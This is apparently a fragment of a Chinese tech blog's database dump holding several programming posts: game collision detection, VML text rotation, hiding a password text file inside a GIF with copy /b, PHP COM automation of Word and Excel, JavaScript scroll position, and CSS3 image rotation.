为了快速地判断相交性，我们使用一种叫分离坐标的方法。这种方法告诉我们，只有15条潜在的分离坐标。如果跌交的情况在每一条分离坐标上都发生了，那么包围盒是相交的。因此，很容易就能判断出两个包围盒是否相交。<br />\r\n<br />\r\n　 　有趣的是，前面提到的时间片大小的问题用分离坐标技术很容易就能解决。回忆一下关于在两个给定时间内是否发生碰撞的问题。如果我们把速度加上，并且在所 有15条坐标轴上的投影都跌交，说明会发生碰撞。我们可以用类似于AABB树那样的数据结构区分碰撞物和受碰物，并判断他们是否有可能发生碰撞。这种运算 可以快速地排除在场景中的大多数情况，产生一个接近理想的O次幂（N logN）的效率。<br />\r\n<br />\r\n<br />\r\n<strong>基于BSP树的碰撞检测技术</strong><br />\r\n<br />\r\n　 　BSP（二叉空间分割）树是另一种类型的空间分割技术，其已经在游戏工业上应用了许多年（Doom是第一个使用BSP树的商业游戏）。尽管在今天BSP 树已经没像过去那么受欢迎了，但现在三个被认可的游戏引擎――Quake II, Unreal, and Lithtech（译者：这是2000年的文章，所以指出的这些游戏才这么老：）仍在广泛地采用这项技术。当你看一下BSP在碰撞检测方面那极度干净漂亮 和高速的效率，立刻能让你眼前一亮。不但BSP树在多边形剪切方面表现出色，而且还能让我们有效地自由运用world-object式的碰撞检测。BSP 树的遍历是使用BSP的一个基本技术。碰撞检测本质上减少了树的遍历或搜索。这种方法很有用因为它能在早期排除大量的多边形，所以在最后我们仅仅是对少数 面进行碰撞检测。正如我前面所说的，用找出两个物体间的分隔面的方法适合于判断两个物体是否相交。如果分隔面存在，就没有发生碰撞。因此我们递归地遍历 world树并判断分割面是否和包围球或包围盒相交。我们还可以通过检测每一个物体的多边形来提高精确度。进行这种检测最简单的一个方法是测试看看物体的 所有部分是否都在分割面的一侧。这种运算真的很简单，我们用迪卡尔平面等式 ax + by + cz + d = 0 去判断点位于平面的哪一侧。如果满足等式，点在平面上；如果ax + by + cz + d &gt; 0那么点在平面的正面；如果ax + by + cz + d &lt; 0点在平面的背面。<br />\r\n<br />\r\n　　在碰撞没发生的时候有一个重要的事情需要注意，就是一个物体（或它的包围盒）必须在分割面的正面或背面。如果在平面的正面和背面都有顶点，说明物体与这个平面相交了。<br />\r\n<br />\r\n　　不幸的是，我们还没有一个很好的方法检测在一个时间间隔内的碰撞（在文章开头提到的方法现在仍在使用）。然而，我已经看到有另外的数据结构像BSP树一样开始广泛使用了。<br />\r\n<br />\r\n<br />\r\n<strong>曲面物体及碰撞检测</strong><br />\r\n<br />\r\n　 　现在我们已经看到了两种多边形物体的碰撞检测，下面一看看如何计算弯曲物体的碰撞。99年发布的几款游戏已经大量地采用曲面了，因此在接下来几年里高效 的曲面碰撞检测将变得十分重要。曲面碰撞检测（要求有给定点上精确的曲面等式）运算开销极大，所以我们要尽量避开它。实际上我们已经讨论了几种能用在这种 情况下的方法。最明显的方法就是用低网格来近似表示曲面，然后使用这个多面体进行碰撞检测。甚至还有更简单的（但精度比较低），就是在曲面的控制顶点（译 者：大概意思就是说每隔一定量的顶点就构造一个凸壳）上构造凸壳用来做碰撞检测。在这种情况下，曲面的碰撞检测十分近拟于传统的多面体碰撞检测。如图9显 示了曲面及它在控制顶点上形成的凸壳。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150728221134820675.gif\" style=\"height:181px; width:320px\" /></p>\r\n\r\n<p>Figure 9. Hull of a curved object.</p>\r\n\r\n<p>是否我们可以结合这两种技术形成一种混合方法？首先我们用凸壳进行碰撞检测然后逐步在凸壳所属的部分细分下去，这样就增加了精度。</p>\r\n\r\n<p><br />\r\n由你决定</p>\r\n\r\n<p>现在我们已经浏览了一些高级的碰撞检测（有一些也是基本的），你应该能够决定什么样的系统更适合你的游戏。你要决定的主要事情是精度、速度、实现的简单程度及系统的适应性。</p>\r\n',0,1438092721,0,0),(111,43,'关于VML文字显示方向的问题','<p>http://msdn.microsoft.com/library/default.asp?url=/workshop/author/vml/shape/textpath/text_v-rotate-letters.asp<br />\r\n上面是MS上的关于文字旋转90度的页面以及代码<br />\r\n可是我试了一下，文字变成了一条线，唉<br />\r\n不知道了，求助..<br />\r\n&lt;v:line&nbsp;&nbsp; from= &quot;50&nbsp;&nbsp; 100 &quot;&nbsp;&nbsp; to= &quot;400&nbsp;&nbsp; 100 &quot;&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;v:fill&nbsp;&nbsp; on= &quot;True &quot;&nbsp;&nbsp; color= &quot;red &quot;/&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;v:path&nbsp;&nbsp; textpathok= &quot;True &quot;/&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;v:textpath&nbsp;&nbsp; on= &quot;True &quot;&nbsp;&nbsp; string= &quot;VML&nbsp;&nbsp; Text &quot;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; style= &quot;v-rotate-letters:True;font:normal&nbsp;&nbsp; normal&nbsp;&nbsp; normal&nbsp;&nbsp; 36pt&nbsp;&nbsp; Arial &quot;/&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/v:line&gt;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&lt;html&nbsp;&nbsp; xmlns:v= &quot;urn:schemas-microsoft-com:vml &quot;&gt;<br />\r\n&lt;head&gt;<br />\r\n&lt;title&gt; &lt;/title&gt;<br />\r\n&lt;meta&nbsp;&nbsp; http-equiv= &quot;Content-Type &quot;&nbsp;&nbsp; content= &quot;text/html;&nbsp;&nbsp; charset=gb2312 &quot;&gt;<br />\r\n&lt;/head&gt;<br />\r\n&lt;STYLE&gt;<br />\r\n&nbsp; v\\:*&nbsp;&nbsp; {&nbsp;&nbsp; BEHAVIOR:&nbsp;&nbsp; url(#default#VML)&nbsp;&nbsp; }<br />\r\n&lt;/STYLE&gt;</p>\r\n\r\n<p>&lt;BODY&gt;<br />\r\n&lt;v:Rect&nbsp;&nbsp; style= &quot;position:relative;width:400px;height:400px &quot;&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;v:fill&nbsp;&nbsp; on= &quot;True &quot;&nbsp;&nbsp; color= &quot;red &quot;/&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;v:path&nbsp;&nbsp; textpathok= &quot;True &quot;/&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;v:textpath&nbsp;&nbsp; on= &quot;True &quot;&nbsp;&nbsp; string= &quot;VML&nbsp;&nbsp; Text &quot;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; style= &quot;v-rotate-letters:True;font:normal&nbsp;&nbsp; normal&nbsp;&nbsp; normal&nbsp;&nbsp; 36pt&nbsp;&nbsp; Arial &quot;/&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/v:Rect&gt;<br />\r\n&lt;/BODY&gt;<br />\r\n&lt;/HTML&gt;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>谢谢楼上的<br />\r\n不过不是这个意思<br />\r\n我试了几下，都没有我想要的效果<br />\r\n我也不知道怎么表达<br />\r\n比如我们画一张柱状图在EXCEL里<br />\r\n要沿着Y轴写标题，其实要从下到上写标题，是从下到上横着写的</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&lt;html&nbsp;&nbsp; xmlns:v= &quot;urn:schemas-microsoft-com:vml &quot;&gt;<br />\r\n&lt;head&gt;<br />\r\n&lt;title&gt; &lt;/title&gt;<br />\r\n&lt;meta&nbsp;&nbsp; http-equiv= &quot;Content-Type &quot;&nbsp;&nbsp; content= &quot;text/html;&nbsp;&nbsp; charset=gb2312 &quot;&gt;<br />\r\n&lt;/head&gt;<br />\r\n&lt;STYLE&gt;<br />\r\n&nbsp; v\\:*&nbsp;&nbsp; {&nbsp;&nbsp; BEHAVIOR:&nbsp;&nbsp; url(#default#VML)&nbsp;&nbsp; }<br />\r\n&lt;/STYLE&gt;</p>\r\n\r\n<p>&lt;BODY&gt;<br />\r\n&lt;v:Rect&nbsp;&nbsp; style= &quot;position:relative;width:40px;height:400px &quot;&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;v:fill&nbsp;&nbsp; on= &quot;True &quot;&nbsp;&nbsp; color= &quot;red &quot;/&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;v:path&nbsp;&nbsp; textpathok= &quot;True &quot;/&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;v:textpath&nbsp;&nbsp; on= &quot;True &quot;&nbsp;&nbsp; string= &quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; VML&nbsp;&nbsp; Text &quot;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; style= &quot;font:normal&nbsp;&nbsp; normal&nbsp;&nbsp; normal&nbsp;&nbsp; 36pt&nbsp;&nbsp; Arial &quot;/&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/v:Rect&gt;<br />\r\n&lt;/BODY&gt;<br />\r\n&lt;/HTML&gt;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;非常感谢，太强了!!!</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&lt;HTML xmlns:v&gt;<br />\r\n&lt;HEAD&gt;<br />\r\n&lt;META http-equiv=&quot;Content-Type&quot; content=&quot;text/html; Charset=gb2312&quot;&gt;<br />\r\n&lt;META name=&quot;GENERATOR&quot; content=&quot;网络程序员伴侣-Lshdic 2002&quot;&gt;<br />\r\n&lt;TITLE&gt;&lt;/TITLE&gt;<br />\r\n&lt;STYLE&gt;<br />\r\nbody{}<br />\r\na{}<br />\r\na:hover{}<br />\r\nv\\:*{behavior:url(#default#VML);} //这里声明了v作为VML公用变量<br />\r\n&lt;/STYLE&gt;<br />\r\n&lt;/HEAD&gt;<br />\r\n&lt;BODY bgcolor=&quot;&quot; text=&quot;&quot; topmargin=&quot;&quot; leftmargin=&quot;&quot;&gt;<br />\r\n&lt;BASE target=&quot;&quot;&gt;</p>\r\n\r\n<p>&lt;v:Roundrect style=&#39;width:200;height:200;&#39;&gt;&nbsp; &lt;!--以圆角表格为轨迹--&gt;<br />\r\n&lt;v:fill on=&#39;true&#39; color=&#39;red&#39;/&gt;<br />\r\n&lt;v:path textpathok=&#39;True&#39;/&gt;&nbsp; &lt;!--文字的排列按照圆角表格的边框&quot;开启&quot;--&gt;<br />\r\n&lt;v:textpath on=&#39;True&#39; style=&#39;font-size:35&#39; string=&#39;http://www.lshdic.com,http://www.lshdic.com&#39;/&gt;<br />\r\n&lt;/v:Roundrect&gt;&amp;nbsp;&lt;p&gt;&amp;nbsp;&lt;p&gt;&amp;nbsp;&lt;p&gt;&amp;nbsp;&lt;p&gt;</p>\r\n\r\n<p>&lt;v:line to=&#39;380,-20&#39;&gt;<br />\r\n&lt;v:path textpathok=&#39;True&#39;/&gt;&nbsp; &lt;!--文字的排列按照横线&quot;开启&quot;--&gt;<br />\r\n&lt;v:textpath on=&#39;True&#39; style=&#39;font-family:华文彩云;font-size:35&#39; string=&#39;http://www.lshdic.com&#39;/&gt;<br />\r\n&lt;/v:line&gt;</p>\r\n\r\n<p>&lt;/BODY&gt;<br />\r\n&lt;/HTML&gt;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>MSDN</p>\r\n\r\n<p>Rotation Attribute<br />\r\n.NET Framework 3.0</p>\r\n\r\n<p>Defines the angle that a shape is rotated. Read/write. VgAngleInDegrees.</p>\r\n\r\n<p>Applies To</p>\r\n\r\n<p>Shape</p>\r\n\r\n<p>Tag Syntax</p>\r\n\r\n<p>&lt;v:element style=&quot;rotation: expression&quot;&gt;</p>\r\n\r\n<p>Script Syntax</p>\r\n\r\n<p>element.rotation=&quot;expression&quot;</p>\r\n\r\n<p>expression=element.rotation</p>\r\n\r\n<p>Remarks</p>\r\n\r\n<p>The value in degrees can be positive or negative, and values greater than 360 are modularized to a 360-degree circle. Positive angles are clockwise. The default value is 0.</p>\r\n\r\n<p>Note that the shape is repositioned after the rotation to reflect the new bounding box coordinates.</p>\r\n\r\n<p>Also note that for scripting, the style attribute is not used and that Rotation is treated as a direct attribute of the shape.</p>\r\n\r\n<p>The&nbsp; Rotation attribute is similar to the standard HTML Rotation attribute for styles.</p>\r\n\r\n<p>VML Standard Attribute</p>\r\n\r\n<p>See Also</p>\r\n\r\n<p>Example</p>\r\n\r\n<p>The rectangle will be tilted 45 degrees.<br />\r\n&nbsp;&nbsp; &lt;v:rect id=myrect fillcolor=&quot;red&quot;&nbsp;&nbsp; style=&quot;position:relative;top:1;left:1;width:20;height:20;rotation:45&quot;&gt;&nbsp;&nbsp; &lt;/v:rect&gt;</p>\r\n\r\n<p>Rotation Attribute Example. (Requires Microsoft Internet Explorer 5 or greater.)</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&lt;html xmlns:v=&quot;urn:schemas-microsoft-com:vml&quot;</p>\r\n\r\n<p>xmlns:o=&quot;urn:schemas-microsoft-com:office:office&quot;&gt;</p>\r\n\r\n<p>&lt;head&gt;</p>\r\n\r\n<p>&nbsp;&lt;title&gt;VML &lt;/title&gt;</p>\r\n\r\n<p>&nbsp;&lt;style&gt;</p>\r\n\r\n<p>&nbsp;o\\:*{behavior:url(#default#vml)}</p>\r\n\r\n<p>&nbsp;v\\:*{behavior:url(#default#vml)}</p>\r\n\r\n<p>&nbsp;&lt;/style&gt;</p>\r\n\r\n<p>&nbsp;&lt;script type=&quot;text/javascript&quot;&gt;</p>\r\n\r\n<p>&nbsp;var rx=0,ry=0,rz=0;</p>\r\n\r\n<p>&nbsp;var xyinput;</p>\r\n\r\n<p>&nbsp;function rot(){</p>\r\n\r\n<p>&nbsp; rx+=3;</p>\r\n\r\n<p>&nbsp; ry+=5;</p>\r\n\r\n<p>&nbsp; rz+=2;</p>\r\n\r\n<p>&nbsp; xyinput=rx+&quot;,&quot;+ry;</p>\r\n\r\n<p>&nbsp; if(rx&gt;360){rx=0;}</p>\r\n\r\n<p>&nbsp; if(ry&gt;360){ry=0;}</p>\r\n\r\n<p>&nbsp; if(rz&gt;360){rz=0;}</p>\r\n\r\n<p>&nbsp; ccc.style.rotation=rz;</p>\r\n\r\n<p>&nbsp; //bbc.rotationangle=xyinput;</p>\r\n\r\n<p>&nbsp; setTimeout(&quot;rot()&quot;,200);</p>\r\n\r\n<p>&nbsp;}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&lt;/script&gt;</p>\r\n\r\n<p>&lt;/head&gt;</p>\r\n\r\n<p>&lt;BODY onload=&quot;rot()&quot;&gt;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&lt;v:line id=&quot;ccc&quot; from=&quot;0,150&quot; to=&quot;500,0&quot;</p>\r\n\r\n<p>style=&quot;position:static;font-family:Times New Roman;&quot;</p>\r\n\r\n<p>title=&quot;.........&quot;&gt;</p>\r\n\r\n<p>&lt;v:path textpathok=&quot;t&quot; /&gt;</p>\r\n\r\n<p>&lt;v:textpath string=&quot;田&quot; on=&quot;t&quot; fitpath=&quot;t&quot;/&gt;</p>\r\n\r\n<p>&lt;v:fill id=&quot;tta&quot; on=&quot;t&quot; color=&quot;rgb(255,255,255)&quot; /&gt;</p>\r\n\r\n<p>&lt;o:extrusion id=&quot;bbc&quot; on=&quot;t&quot; foredepth=&quot;20&quot;/&gt;</p>\r\n\r\n<p>&lt;/v:line&gt;</p>\r\n\r\n<p>&lt;/BODY&gt;</p>\r\n\r\n<p>&lt;/HTML&gt;</p>\r\n',0,1438093032,0,0),(112,26,'把密码隐藏到图片里','<p>工具/原料</p>\r\n\r\n<p>一张【GIF图片】。 需要保密的密码文件。</p>\r\n\r\n<p>步骤/方法</p>\r\n\r\n<p>1)以D盘为示范，首先在D盘的根目录下新建一个如：名为【41xuexi.gif】的图片，接着再创建一个记事本的【文本文档】文件，例如【41xuexi.txt】，并在记事本里写上你要隐藏的密码。<br />\r\n注：在打开的记事本里先空两行在写，这样打开后比较好找到。</p>\r\n\r\n<p>2)点击【开始】&mdash;【运行】。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150728222546318902.jpg\" style=\"height:294px; width:127px\" /></p>\r\n\r\n<p>3)在运行里输入：【cmd】 确定。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150728222639229776.jpg\" style=\"height:175px; width:347px\" /></p>\r\n\r\n<p>4)再在弹出的对话框中，输入【 cd 空格 \\ 】，然后按 回车键。<br />\r\n再输入【D ：】按回车键。<br />\r\n接着输入：【copy】空格【41xuexi.gif】【 / b】空格【+】空格【41xuexi.txt】空格【tu.gif】（tu.gif ）就是新生成图片名。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150728222749832815.jpg\" style=\"height:315px; width:480px\" /></p>\r\n\r\n<p>5)返回到D盘，我们可以看到新生成了一个名为【tu.gif】的图片。<br />\r\n完成图片</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150728222843109722.jpg\" style=\"height:135px; width:98px\" /></p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150728222843109723.gif\" style=\"height:220px; width:176px\" /></p>\r\n\r\n<p>6)想要查看图片里隐藏的信息时，不要直接打开，而是右击图片，选择【用记事本打开】。把滚动条拖到底，就可以看到我刚刚写入的隐藏内容了。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150728223259391659.jpg\" style=\"height:107px; width:179px\" /></p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150728223314645883.jpg\" style=\"height:368px; width:480px\" /></p>\r\n',0,1438094006,0,0),(113,10,'PHP显示、编辑、保存word和excel','<p>PHP4 COM的MS Word例子<br />\r\n&lt;?php<br />\r\n#*****************************************************<br />\r\n# 这个例子来自Zend站点，并做了一点修改。<br />\r\n# 将会打开一个Word的实例，<br />\r\n# 输入一行&ldquo;This is a test...&rdquo;<br />\r\n# 存为&ldquo;Useless test.doc&rdquo;。<br />\r\n#*****************************************************<br />\r\n#实例化一个Word控件<br />\r\n$word = new COM(&quot;word.application&quot;) or die(&quot;不能实例化Word&quot;);<br />\r\n#取得并输出版本号<br />\r\nprint &quot;载入Word, 版本 {$word-&gt;Version}&lt;BR&gt;&quot;;<br />\r\n#用com_get取得版本号<br />\r\n$testversion = com_get($word-&gt;application,version);<br />\r\nprint &quot;用Com_get()取得的版本: $testversion &lt;BR&gt;&quot;;<br />\r\n#让Word可见<br />\r\n$word-&gt;Visible = 1;<br />\r\n#打开一个新文档<br />\r\n$word-&gt;Documents-&gt;Add();<br />\r\n#写<br />\r\n$word-&gt;Selection-&gt;TypeText(&quot;This is a test...&quot;);<br />\r\n#存<br />\r\n$word-&gt;Documents[1]-&gt;SaveAs(&quot;Useless test.doc&quot;);<br />\r\n#手工关闭Word，如果你想看到文档则注释下面这行<br />\r\n$word-&gt;Quit();</p>\r\n\r\n<p>?&gt;</p>\r\n\r\n<p>&nbsp;<br />\r\nPHP4 COM的MS Excel例子<br />\r\n&lt;?php<br />\r\n#设置工作簿，<br />\r\n#在这里我们用Excel安装时自带的：SOLVSAMP.XLS<br />\r\n$workbook = &quot;C:\\rogram Files\\Microsoft office\\OfficeSamples\\SOLVSAMP.XLS&quot;;<br />\r\n$sheet = &quot;Quick Tour&quot;;</p>\r\n\r\n<p>#实例化工作表控件<br />\r\n$ex = new COM(&quot;Excel.sheet&quot;) or Die (&quot;Did not connect&quot;);</p>\r\n\r\n<p>#取得程序名称和版本<br />\r\nprint &quot;程序名称：{$ex-&gt;Application-&gt;value}&lt;BR&gt;&quot; ;<br />\r\nprint &quot;版本：{$ex-&gt;Application-&gt;version}&lt;BR&gt;&quot;;</p>\r\n\r\n<p>#打开工作簿<br />\r\n$wkb = $ex-&gt;application-&gt;Workbooks-&gt;Open($workbook) or Die (&quot;Did not open&quot;);</p>\r\n\r\n<p>#另存一份，这样就不会破坏原来的文件了<br />\r\n$ex-&gt;Application-&gt;ActiveWorkbook-&gt;SaveAs(&quot;Ourtest&quot;);<br />\r\n#$ex-&gt;Application-&gt;Visible = 1; #去掉注释可以让Excel可见</p>\r\n\r\n<p>#读取一个单元格的内容（E11）<br />\r\n$sheets = $wkb-&gt;Worksheets($sheet); #选择工作表<br />\r\n$sheets-&gt;activate; #激活<br />\r\n$cell = $sheets-&gt;Cells(11,5) ; #选择单元格（行列号）<br />\r\n$cell-&gt;activate; #激活<br />\r\nprint &quot;Old Value = {$cell-&gt;value} &lt;BR&gt;&quot;; #打印内容：10000<br />\r\n$cell-&gt;value = 15000; #改为15000<br />\r\nprint &quot;New value = {$cell-&gt;value}&lt;BR&gt; &quot;; #打印新内容：15000</p>\r\n\r\n<p>#最后，重新计算工作表<br />\r\n$sheets-&gt;Calculate; #当计算选项是手工时需要<br />\r\n#看看结果total cost(单元格E13)<br />\r\n$cell = $sheets-&gt;Cells(13,5) ; #选择单元格<br />\r\n$number = Number_format($cell-&gt;value);<br />\r\nprint &quot;New Total cost =$$number - was $47,732 before.&lt;BR&gt;&quot;;<br />\r\n#将会打印$57,809</p>\r\n\r\n<p>#使用Excel的内置函数：<br />\r\n#Function: PMT(percent/12 months,Number of payments,Loan amount)<br />\r\n$pay = $ex-&gt;application-&gt;pmt(0.08/12,10,10000);<br />\r\n$pay = sprintf(&quot;%.2f&quot;,$pay);<br />\r\nprint &quot;Monthly payment for $10,000 loan @8% interest /10 months: $ $pay&lt;BR&gt;&quot;;<br />\r\n#将会打印monthly payment = $ -1,037.03</p>\r\n\r\n<p>#保存改过的工作簿<br />\r\n$ex-&gt;Application-&gt;ActiveWorkbook-&gt;SaveAs(&quot;Ourtest&quot;);<br />\r\n#关闭所有工作簿<br />\r\n$ex-&gt;application-&gt;ActiveWorkbook-&gt;Close(&quot;False&quot;);<br />\r\nunset ($ex);<br />\r\n?&gt;</p>\r\n',0,1438094095,0,0),(114,1,'js获得滚动条位置 是否存在 距离某一侧像素值(转)','<p>javascript中如何判断dom对象是否出现了滚动条</p>\r\n\r\n<p>某些场景下需要用javascript去获取页面中的某个dom对象是否出现了滚动条，</p>\r\n\r\n<p>那么javascript的dom操作为我们提供了哪些方法可以得到呢？</p>\r\n\r\n<p>参考DHTML手册会发现：</p>\r\n\r\n<p>dom对象有offsetTop和 offsetLeft属性，</p>\r\n\r\n<p>它们所获得的值是当前滚动条所滚动的数值；</p>\r\n\r\n<p>当滚动条没有滚动或者没有出现的时候，</p>\r\n\r\n<p>这两个值都是0。</p>\r\n\r\n<p>dom对象还有属性：offsetHeight和 scrollHeight，</p>\r\n\r\n<p>offsetHeight是dom对象相对父级元素的可见高度，</p>\r\n\r\n<p>scrollHeight 是dom对象包含了滚动部分的高度。</p>\r\n\r\n<p>有了上述的四个基本属性，</p>\r\n\r\n<p>那么我们可以尝试进行判断（当然以下的判断是在没有设置css样式：overflow:hidden的情况下的）：</p>\r\n\r\n<p>当dom对象offsetTop &gt; 0的时候，说明滚动条已经存在了；</p>\r\n\r\n<p>另外，如果scrollHeight &gt; offsetHeight即包含滚动部分的高度超出可视高度的时候，</p>\r\n\r\n<p>滚动条即已出现。</p>\r\n\r\n<p>综合上述两条可以得出以下结论：</p>\r\n\r\n<p>if (dom.offsetTop &gt; 0 || dom.scrollHeight &gt; dom.offsetHeight) {</p>\r\n\r\n<p>//滚动条已出现</p>\r\n\r\n<p>}</p>\r\n\r\n<p>当然，</p>\r\n\r\n<p>是不是只有这两个条件可以判断滚动条是否存在呢？</p>\r\n\r\n<p>如有朋友有更好的方法，可点击本文后面的&ldquo;我要留言&rdquo;给我留言，</p>\r\n\r\n<p>感谢赐教～</p>\r\n\r\n<p>js获得滚动条位置</p>\r\n\r\n<p>注意body的使用</p>\r\n\r\n<p>function getScroll()</p>\r\n\r\n<p>{</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; var t, l, w, h;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; if (document.documentElement &amp;&amp; document.documentElement.scrollTop) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; t = document.documentElement.scrollTop;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; l = document.documentElement.scrollLeft;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; w = document.documentElement.scrollWidth;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; h = document.documentElement.scrollHeight;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; } else if (document.body) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; t = document.body.scrollTop;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; l = document.body.scrollLeft;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; w = document.body.scrollWidth;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; h = document.body.scrollHeight;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; return { t: t, l: l, w: w, h: h };</p>\r\n\r\n<p>}</p>\r\n\r\n<p>获取浏览器垂直滚动条向下滚动的像素</p>\r\n\r\n<p>关于js中 document.body.scrollTop 不能返回正确值的原因 收藏</p>\r\n\r\n<p>本来是为了通过 document.body.scrollTop来获取浏览器垂直滚动条向下滚动的像素，但是不管滚动条在什么位置总是返回是0，造成这样的原因和html的头部声明有关，如果头部声明 为：&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;，这样肯定得到的结果是 0，如果该为&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;就能得到正确的结果，对于第一种头部声明想要得滚动条的滚动的高度怎么办，解决方法有两种</p>\r\n\r\n<p>1、var scrollPos; if (typeof window.pageYOffset != &#39;undefined&#39;) {&nbsp;&nbsp;&nbsp; scrollPos = window.pageYOffset; } else if (typeof document.compatMode != &#39;undefined&#39; &amp;&amp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; document.compatMode != &#39;BackCompat&#39;) {&nbsp;&nbsp;&nbsp; scrollPos = document.documentElement.scrollTop; } else if (typeof document.body != &#39;undefined&#39;) {&nbsp;&nbsp;&nbsp; scrollPos = document.body.scrollTop; }</p>\r\n\r\n<p>2、用document.documentElement.scrollTop 替代 document.body.scrollTop</p>\r\n',0,1438094195,0,0),(115,3,'图片旋转效果的一些研究、jQuery插件及实例','<p>一、前面的唠叨</p>\r\n\r\n<p>图片的旋转可以说是一种效果，但是逐渐的，旋转已经不单单是属于视觉效果那个范畴，其更具有使用性，功能性。我们都知道，照片有时候是需要横过来的拍的，当我们预览或共享到web上时需要进行旋转。这个操作在以往可能更多的是交给软件去完成，然后再将旋转到正常角度的图片发布到web上。但是，现在直接就可以在web上对图片进行旋转之类的处理，就算图片处理软件再怎么方便好用，也不及直接发布时对图片做调整来的方便。这就是图片旋转功能的实用意义。我们可以在新浪微博上见到这种图片旋转的功能。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731105814129333.jpg\" style=\"height:119px; width:483px\" /></p>\r\n\r\n<p>二、CSS3与图片旋转</p>\r\n\r\n<p>CSS3中有支持图片旋转的属性：CSS3 &gt;&gt; transform &gt;&gt; rotate 。举个简单的例子，例如下面的CSS代码：<br />\r\n-moz-transform:rotate(-90deg); -webkit-transform:rotate(-90deg);</p>\r\n\r\n<p>将其作用于图片上，结果如下（截自Firefox3.5）：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731105850351422.jpg\" style=\"height:145px; width:109px\" /></p>\r\n\r\n<p>从左图可以看到，图片旋转了-90度，也就是顺时针旋转了270度。CSS3下的旋转效果不仅可以作用于图片，任何的inline水平或是block水平的元素都受其作用，并且可以实现任意角度的旋转，确实很实用。前面我也写过一篇相关的文章：CSS3 transition实现超酷图片墙动画效果 ，里面有一些关于CSS3 transform的介绍。<br />\r\n不可避免，说到CSS3，就要扯到&ldquo;支持性&rdquo;这个问题，与其他些CSS3属性类似，IE浏览器不支持，Opera也不支持。只有Firefox3+，chrome与Safari浏览器支持transform的rotate属性，所以，只想用CSS实现旋转效果，有难度。其他不说，得要解决浏览器大头IE才是，好在IE的私有滤镜可以实现元素的旋转效果，见下一部分。<br 